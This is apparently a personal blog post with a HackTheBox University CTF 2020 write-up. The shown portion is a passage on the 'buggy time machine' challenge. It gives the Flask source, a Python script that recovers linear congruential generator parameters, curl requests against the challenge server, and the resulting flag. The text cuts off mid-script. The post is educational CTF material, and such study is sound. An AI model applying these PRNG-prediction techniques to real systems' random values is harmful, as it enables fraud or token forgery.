<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer-when-downgrade">

    <title>HTB Uni CTF 2020</title>
    <meta name="description" content="">

    <link rel="stylesheet" href="https:&#x2F;&#x2F;heinen.dev&#x2F;main.css">

    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://heinen.dev/atom.xml">
    

    
    
</head>
<body>
    <a class="skip-main" href="#main">Skip to content</a>
    <div class="container">
        <header> 
            <h1 class="site-header">
                <a href="https:&#x2F;&#x2F;heinen.dev">Teddy Heinen</a>
            </h1>
            <nav>
                
                
                
                <a  href="https:&#x2F;&#x2F;heinen.dev&#x2F;about&#x2F;">About</a>
                
                
                <a  href="https:&#x2F;&#x2F;heinen.dev&#x2F;tags&#x2F;">Tags</a>
                
                
            </nav>
        </header>
        <main id="main" tabindex="-1">
            

<article class="post">
    <header>
        <h1>HTB Uni CTF 2020</h1>
    </header>

    <ul class="toc">
	
	    <li>
	        <a href="https://heinen.dev/htb-uni-ctf-2020/#buggy-time-machine">buggy time machine</a>
	        
	            <ul class="toc">
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#initial-review">initial review</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#cracking-lcg-parameters">cracking LCG parameters</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#predicting-the-next-year">predicting the next year</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#determining-what-seed-gets-us-to-2020">determining what seed gets us to 2020</a>
	                    </li>
	                
	            </ul>
	        
	    </li>
	
	    <li>
	        <a href="https://heinen.dev/htb-uni-ctf-2020/#rigged-lottery">rigged_lottery</a>
	        
	            <ul class="toc">
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#initial-review-1">initial review</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#putting-it-all-together">putting it all together</a>
	                    </li>
	                
	            </ul>
	        
	    </li>
	
	    <li>
	        <a href="https://heinen.dev/htb-uni-ctf-2020/#mirror">mirror</a>
	        
	            <ul class="toc">
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#initial-review-2">initial review</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#leaking-libc">leaking libc</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#putting-it-all-together-1">putting it all together</a>
	                    </li>
	                
	            </ul>
	        
	    </li>
	
	    <li>
	        <a href="https://heinen.dev/htb-uni-ctf-2020/#hi-my-name-is-what">Hi! My name is (what?)</a>
	        
	            <ul class="toc">
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#initial-review-3">initial review</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#i-can-so-ptrace-alternative-title-how-you-can-just-overwrite-any-dynamic-library-function">i can so ptrace (alternative title: how you can just overwrite any dynamic library function)</a>
	                    </li>
	                
	            </ul>
	        
	    </li>
	
	    <li>
	        <a href="https://heinen.dev/htb-uni-ctf-2020/#ircware">ircware</a>
	        
	            <ul class="toc">
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#initial-review-4">initial review</a>
	                    </li>
	                
	                    <li>
	                        <a href="https://heinen.dev/htb-uni-ctf-2020/#so-what-s-the-password">so what&#x27;s the password?</a>
	                    </li>
	                
	            </ul>
	        
	    </li>
	
	</ul>

    <div class="content">
        <p>A couple weeks back I competed in HackTheBox's university CTF with a few other students from the Texas A&amp;M Cybersecurity Club.  We placed in 37th place out of a few hundred.</p>
<span id="continue-reading"></span><h1 id="buggy-time-machine">buggy time machine</h1>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">I am the Doctor and I am in huge trouble. Rumors have it, you are the best time machine engineer in the galaxy. I recently bought a new randomiser for Tardis on Yquantine, but it must be counterfeit. Now every time I want to time travel, I will end up in a random year. Could you help me fix this? I need to find Amy and Rory! Daleks are after us. Did I say I am the Doctor?
</span></code></pre><h2 id="initial-review">initial review</h2>
<pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">os
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">datetime </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">datetime
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">flask </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">Flask</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">render_template
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">flask </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">request
</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">random
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">math </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">gcd
</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">json
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">secret </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">flag</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">hops</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">msg

</span><span style="color:#ffa759;">class </span><span style="color:#73d0ff;">TimeMachineCore</span><span style="color:#ccc9c2;">:
	
	n </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
	</span><span style="color:#ccc9c2;">m </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
	</span><span style="color:#ccc9c2;">c </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">...
		

	</span><span style="color:#ffa759;">def </span><span style="color:#f28779;">__init__</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">seed</span><span style="color:#ccc9c2;">):
		</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">year </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">seed 

	</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">next</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">self</span><span style="color:#ccc9c2;">):
		</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">year </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(</span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">year </span><span style="color:#f29e74;">* </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">m </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">c) </span><span style="color:#f29e74;">% </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">n
		</span><span style="color:#ffa759;">return </span><span style="font-style:italic;color:#5ccfe6;">self</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">year

app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span style="color:#ccc9c2;">(__name__)
a </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">datetime</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">now</span><span style="color:#ccc9c2;">()
seed </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#ccc9c2;">(a</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">strftime</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;</span><span style="color:#ffcc66;">%Y%m%d</span><span style="color:#bae67e;">&#39;</span><span style="color:#ccc9c2;">)) </span><span style="color:#f29e74;">&lt;&lt;</span><span style="color:#ffcc66;">1337 </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">random</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getrandbits</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">128</span><span style="color:#ccc9c2;">)
gen </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">TimeMachineCore</span><span style="color:#ccc9c2;">(seed)


</span><span style="color:#ccc9c2cc;">@</span><span style="color:#ccc9c2;">app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;/next_year&#39;</span><span style="color:#ccc9c2;">)
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">next_year</span><span style="color:#ccc9c2;">():
	</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span style="color:#ccc9c2;">({</span><span style="color:#bae67e;">&#39;year&#39;</span><span style="color:#ccc9c2cc;">:</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span style="color:#ccc9c2;">())})

</span><span style="color:#ccc9c2cc;">@</span><span style="color:#ccc9c2;">app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;/predict_year&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span style="color:#ccc9c2;">])
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">predict_year</span><span style="color:#ccc9c2;">():
	
	prediction </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">request</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">json[</span><span style="color:#bae67e;">&#39;year&#39;</span><span style="color:#ccc9c2;">]
	</span><span style="color:#ffa759;">try</span><span style="color:#ccc9c2;">:

		</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">prediction </span><span style="color:#f29e74;">==</span><span style="color:#ccc9c2;">gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span style="color:#ccc9c2;">():
			</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span style="color:#ccc9c2;">({</span><span style="color:#bae67e;">&#39;msg&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ccc9c2;">msg})
		</span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
			</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span style="color:#ccc9c2;">({</span><span style="color:#bae67e;">&#39;fail&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;wrong year&#39;</span><span style="color:#ccc9c2;">})

	</span><span style="color:#ffa759;">except</span><span style="color:#ccc9c2;">:

		</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span style="color:#ccc9c2;">({</span><span style="color:#bae67e;">&#39;error&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&#39;year not found in keys.&#39;</span><span style="color:#ccc9c2;">})

</span><span style="color:#ccc9c2cc;">@</span><span style="color:#ccc9c2;">app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;/travelTo2020&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span style="color:#ccc9c2;">])
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">travelTo2020</span><span style="color:#ccc9c2;">():
	seed </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">request</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">json[</span><span style="color:#bae67e;">&#39;seed&#39;</span><span style="color:#ccc9c2;">]
	gen </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">TimeMachineCore</span><span style="color:#ccc9c2;">(seed)
	</span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(hops): state </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">gen</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">next</span><span style="color:#ccc9c2;">()
	</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">state </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">2020</span><span style="color:#ccc9c2;">:
		</span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span style="color:#ccc9c2;">({</span><span style="color:#bae67e;">&#39;flag&#39;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ccc9c2;">flag})

</span><span style="color:#ccc9c2cc;">@</span><span style="color:#ccc9c2;">app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;/&#39;</span><span style="color:#ccc9c2;">)
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">home</span><span style="color:#ccc9c2;">():
	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;index.html&#39;</span><span style="color:#ccc9c2;">)
</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span style="color:#ccc9c2;">:
	app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">debug</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2;">)
</span></code></pre>
<p>The first thing I noticed is that TimeMachineCore is a <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">linear congruential generator</a>.  LCGs are not cryptographically secure so it is highly likely that we will be attacking the randomness.</p>
<p>We have three routes that we can interact with the time machine with:</p>
<ul>
<li><code>/next_year</code> which generates a random number using a TimeMachineCore that was seeded with random bits at the beginning of the program</li>
<li><code>/predict_year</code> which will give us the secret variable <code>msg</code> if we can predict the number it generates</li>
<li><code>travelTo2020</code> which will give us the flag if we can provided it a seed which generates <code>2020</code> after <code>hops</code> random numbers</li>
</ul>
<h2 id="cracking-lcg-parameters">cracking LCG parameters</h2>
<p>So the first thing to do here is cracking the LCG parameters.  We have the ability to generate and receive an arbitrary number LCG states so it is pretty trivial to reverse engineer what the parameters which generated it are.  I'm not going to go into the math behind how it works, but <a href="https://tailcall.net/blog/cracking-randomness-lcgs/">Cracking RNGs: Linear Congruential Generators</a> is the article I used if you would like to read about it.</p>
<pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">functools </span><span style="color:#ffa759;">import </span><span style="color:#f28779;">reduce
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">math </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">gcd

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">egcd</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">b</span><span style="color:#ccc9c2;">):
    lastremainder, remainder </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(a), </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(b)
    x, lastx, y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0
    </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">remainder:
        lastremainder, (quotient</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">remainder) </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">remainder, </span><span style="color:#f28779;">divmod</span><span style="color:#ccc9c2;">(lastremainder</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">remainder)
        x, lastx </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">lastx </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">quotient</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">x, x
        y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">lasty </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">quotient</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">y, y
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">lastremainder, lastx </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">a </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">), lasty </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">b </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">modinv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">m</span><span style="color:#ccc9c2;">):
    g, x, y </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">egcd</span><span style="color:#ccc9c2;">(a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">m)
    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">g </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">:
        </span><span style="color:#ffa759;">raise </span><span style="font-style:italic;color:#5ccfe6;">ValueError</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;modinv for </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> does not exist&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span style="color:#ccc9c2;">(a))
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">x </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">m

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_increment</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">multiplier</span><span style="color:#ccc9c2;">):
    increment </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">]</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">multiplier) </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">modulus
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">modulus, multiplier, increment

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">modulus</span><span style="color:#ccc9c2;">):
    multiplier </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">]) </span><span style="color:#f29e74;">* </span><span style="color:#ffd580;">modinv</span><span style="color:#ccc9c2;">(states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus) </span><span style="color:#f29e74;">% </span><span style="color:#ccc9c2;">modulus
    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_increment</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">multiplier)


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">crack_unknown_modulus</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">states</span><span style="color:#ccc9c2;">):
    diffs </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[s1 </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">s0 </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">s0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">s1 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">states[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">])]
    zeroes </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[t2</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">t0 </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">t1</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">t1 </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">t0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">t1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">t2 </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span style="color:#ccc9c2;">(diffs</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">diffs[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">diffs[</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ccc9c2;">])]
    modulus </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">reduce</span><span style="color:#ccc9c2;">(gcd</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">zeroes))
    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">crack_unknown_multiplier</span><span style="color:#ccc9c2;">(states</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">modulus)


values </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">[
	</span><span style="color:#ffcc66;">584293201</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">1514369420</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">1930412587</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">1483060100</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">279230708</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">1138137296</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">2098757662</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">1590055177</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">340421540</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">2090774143</span><span style="color:#ccc9c2cc;">,
	</span><span style="color:#ffcc66;">617182341
</span><span style="color:#ccc9c2;">]

</span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#ffd580;">crack_unknown_modulus</span><span style="color:#ccc9c2;">(values))
</span></code></pre><pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python crack_lcg_parameters.py
(2147483647, 48271, 0)
</span></code></pre><h2 id="predicting-the-next-year">predicting the next year</h2>
<p>We know the parameters and the last state so we can just solve for the next year trivially like so: <code>(617182341 * 48271) mod 2147483647</code></p>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ curl -X POST http://docker.hackthebox.eu:30263/predict_year --header &quot;Content-Type: application/json&quot;  --data &#39;{&quot;year&quot;: 465839415}&#39;
{&quot;msg&quot;: &quot;*Tardis trembles*\nDoctor this is Amy! I am with Rory in year 2020. You need to rescue us within exactly 876578 hops. Tardis bug has damaged time and space.\nRemeber, 876578 hops or the universes will collapse!&quot;}
</span></code></pre><h2 id="determining-what-seed-gets-us-to-2020">determining what seed gets us to 2020</h2>
<p>Fun fact: an LCG is reversible!  I'm not gonna bother with the math but it's a fairly simple function to get the previous state and you can see it in my solution script below.  See <a href="https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator">this stackoverflow post</a> if you're interested in the math.</p>
<pre style="background-color:#212733;">
<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ curl -X POST http://docker.hackthebox.eu:30263/travelTo2020 --header &quot;Content-Type: application/json&quot;  --data &#39;{&quot;seed&quot;: 2113508741}&#39;
{&quot;flag&quot;: &quot;HTB{l1n34r_c0n9ru3nc35_4nd_prn91Zz}&quot;}
</span></code></pre><pre style="background-color:#212733;">
<code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">functools </span><span style="color:#ffa759;">import </span><span style="color:#f28779;">reduce
</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">math </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">gcd

</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">egcd</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">b</span><span style="color:#ccc9c2;">):
    lastremainder, remainder </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(a), </span><span style="color:#f28779;">abs</span><span style="color:#ccc9c2;">(b)
    x, lastx, y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0
    </span><span style="color:#ffa759;">while </span><span style="color:#ccc9c2;">remainder:
        lastremainder, (quotient</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">remainder) </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">remainder, </span><span style="color:#f28779;">divmod</span><span style="color:#ccc9c2;">(lastremainder</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">remainder)
        x, lastx </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">lastx </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">quotient</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">x, x
        y, lasty </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">lasty </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">quotient</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">y, y
    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">lastremainder, lastx </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">a </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">), lasty </span><span style="color:#f29e74;">* </span><span style="color:#ccc9c2;">(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">b </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0 </span><span style="color:#ffa759;">else </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)


</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">modinv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">m</span><span style="color:#ccc9c2;">):
    g, x, y </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">egcd</span><span style="color:#ccc9c2;">(a</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">m)
